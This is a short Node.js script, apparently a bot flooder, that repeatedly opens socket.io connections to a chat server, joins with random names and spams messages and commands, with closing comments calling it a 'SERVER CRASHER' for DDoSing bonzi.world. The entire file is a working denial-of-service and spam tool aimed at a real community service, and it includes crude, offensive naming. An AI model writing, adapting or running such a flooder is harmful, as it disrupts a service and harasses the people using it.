var io = require("socket.io-client");
setInterval(function(){
var socket = io("http://localhost") // CHANGE IT, IF NEEDED.
var beggarness3 = ['L','A','U','G','H','LAUGHING'] // put the name
var colors = ['purple']
var whatistheroom = "";
socket.emit('login',{name:beggarness3[Math.floor(Math.random()*beggarness3.length)],room:whatistheroom});console.log('The Room ID is joined at ' + whatistheroom)
socket.emit('command', {list:['color',colors[Math.floor(Math.random()*colors.length)]]});
var wtf = ['Laugh.','Laugh at me!','do the /laugh','everyone do /laugh','not clap, only laughing voice!','HE HE HE HE HA HA HA!','HEHEHE HU HU HAA!...'] // add the quotes
setTimeout(function()
{
	socket.emit('talk',{text:wtf[Math.floor(Math.random()*wtf.length)]})
},1000);
var fuckervideos = ['laugh','clap','surprised','god','pope','chalmers','seymour','hitler','loskyalt','losky','geri'] // PUT THE COMMAND
var beggarness = ['Laugh.','Laugh at me!','do the /laugh','everyone do /laugh','not clap, only laughing voice!','HE HE HE HE HA HA HA!','HEHEHE HU HU HAA!...'] //put the quote when anytime he says
setInterval(function(){socket.emit('talk',{text:beggarness[Math.floor(Math.random()*beggarness.length)]}); console.log("Typing...")},Math.random()*30000);
setInterval(function(){socket.emit('command',{list:[fuckervideos[Math.floor(Math.random()*fuckervideos.length)]]}); console.log("Doing the actions...")},Math.random()*3000);
var beggarness2 = ['laugh is ended bye','ends!','not, haha!','i like your videos! not! hahaha','k'] // exiting announcement
setTimeout(function(){socket.emit('talk',{text:beggarness2[Math.floor(Math.random()*beggarness2.length)]});  console.log("Exiting...")},175000);
setTimeout(function(){socket.emit("disconnect"); console.log("oh no"); maggot()},181000)}, Math.random()*300)

//SERVER CRASHER
//CRASH THE SERVER FROM THE OTHER PEOPLE, YOU CAN DDOS BONZI.WORLD BY BAGELCHIP (NATHAN THOMPSON). ALL RIGHTS RESERVED 2020.